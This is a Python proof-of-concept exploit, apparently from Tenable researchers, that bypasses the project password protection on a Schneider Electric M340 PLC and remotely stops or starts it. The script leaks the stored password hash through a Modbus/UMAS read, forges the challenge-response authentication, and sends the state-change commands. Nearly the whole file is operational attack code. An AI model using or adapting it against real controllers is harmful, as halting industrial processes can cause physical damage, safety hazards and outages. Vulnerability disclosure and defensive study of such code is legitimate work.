# PoC to remote start/stop Schneider Electric M340 PLC configured with
# Project and Controller Protection password , aka "CyberSecurity"
# By: Nicholas Miles of Tenable Security

from hashlib import sha256
import sys
import struct
import binascii
import socket
import os

if(len(sys.argv) != 3):
    print("")
    print("Usage: %s <target_ip> <stop/run>" % sys.argv[0])
    print("")
    exit()

print("")
our_id = "TenableRocks"

target = sys.argv[1]

op = sys.argv[2]

if(op != "stop" and op != "run"):
    print "operation must be 'stop' or 'run'"

transaction_id = 1

def get_umas_data(s):
    modbus_header = s.recv(7)
    data_len = struct.unpack(">H", modbus_header[5:7])[0]
    data = s.recv(data_len)
    return data

def get_modbus_pkt(data):
    global transaction_id
    pkt = struct.pack(">H", transaction_id)
    pkt += "\0\0"
    pkt += struct.pack(">H", len(data)+1)
    pkt += "\0"
    pkt += data
    transaction_id += 1
    return pkt

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
print("Connecting to target %s" % target)
s.connect((target, 502))

read_id_pkt = "\x5a\x00\x02"
s.send(get_modbus_pkt(read_id_pkt))
data = get_umas_data(s)
hardware_id = data[17:21]
print("  Hardware ID: %s" % binascii.hexlify(hardware_id))

init_comm_pkt = "\x5a\x00\x01\x00"
s.send(get_modbus_pkt(read_id_pkt))
data = get_umas_data(s)
if(data[1:3] != "\x00\xfe"):
    print("  INIT_COMM failed.")
    exit()
print("  INIT_COMM success.")

read_plc_info_pkt = "\x5a\x00\x04"
s.send(get_modbus_pkt(read_plc_info_pkt))
data = get_umas_data(s)
plc_state = ""
if(data[63] == "\x01"):
    print("  PLCSTATUS: PLC is STOPPED")
    plc_state = "stopped"
elif(data[63] == "\x02"):
    print("  PLCSTATUS: PLC is RUNNING")
    plc_state = "running"
else:
    print("  PLCSTATUS: PLC STATE UNKNOWN")

read_auth_blk_pkt = "\x5a\x00\x20\x01\x14\x00\x00\x00\x00\x00\x00\x02"
s.send(get_modbus_pkt(read_auth_blk_pkt))
data = get_umas_data(s)

auth_info = []
cur_str = ''
pass_info = data[256:]
for i in range(0, len(pass_info)):
    if(pass_info[i] == '\0'):
        if(len(cur_str) > 0):
            auth_info.append(cur_str)
            cur_str = ''
    else:
        cur_str += pass_info[i]

ppassword_b64 = ''

if(len(auth_info) == 6):
  print("  Project: %s" % auth_info[0])
  print("  Program Safety Protection password/crypt: %s" % auth_info[1])
  ppassword_b64 = auth_info[2]
  print("  Project password base64: %s" % auth_info[2])
else:
  ppassword_b64 = auth_info[1]
  print("  Project password base64: %s" % auth_info[1])

client_nonce = os.urandom(32)
print("  Sending nonce...")

session_id = "\x10\xaa\x00\x00"

client_nonce_pkt = "\x5a\x00\x6e\x02" + session_id + client_nonce + "\x00\x00"
s.send(get_modbus_pkt(client_nonce_pkt))
data = get_umas_data(s)
server_nonce = data[5:]
print("  Generated Client Nonce: %s" % binascii.hexlify(client_nonce))
print("  Received Server Nonce: %s" % binascii.hexlify(server_nonce))

auth_hash = sha256(server_nonce + ppassword_b64 + client_nonce).hexdigest()
#print(binascii.hexlify(server_nonce + ppassword_b64 + client_nonce))
print("  Authentication SHA256: %s" % auth_hash)

id_data = our_id + "\0" + auth_hash
id_len = len(id_data)
id_data = chr(id_len) + id_data

reservation_pkt = "\x5a\x00\x10" + session_id + id_data
s.send(get_modbus_pkt(reservation_pkt))
data = get_umas_data(s)

if(data[1:3] == "\x00\xfe"):
    print("  Authentication SUCCESS")

check_byte = data[3]

to_send = ""
if(op == "run"):
  if(plc_state == "running"):
      print("PLC already running, exiting...")
      exit()
  to_send = "\x5a" + check_byte + "\x40\xff\x00"
  print("  Starting PLC...")
else:
  if(plc_state == "stopped"):
      print("PLC already stopped, exiting...")
      exit()
  to_send = "\x5a" + check_byte + "\x41\xff\x00"
  print("  Stopping PLC...")


auth_hash_pre = sha256(hardware_id + client_nonce).digest()
auth_hash_post = sha256(hardware_id + server_nonce).digest()

auth_hash = sha256(auth_hash_pre + to_send + auth_hash_post).digest()

change_state_pkt = "\x5a" + check_byte + "\x38\01" + auth_hash + to_send

s.send(get_modbus_pkt(change_state_pkt))
data = get_umas_data(s)

print("  Releasing reservation...")
to_send = "\x5a" + check_byte + "\x11"

auth_hash = sha256(auth_hash_pre + to_send + auth_hash_post).digest()
release_reservation_pkt = "\x5a" + check_byte + "\x38\01" + auth_hash + to_send

s.send(get_modbus_pkt(release_reservation_pkt))
data = get_umas_data(s)
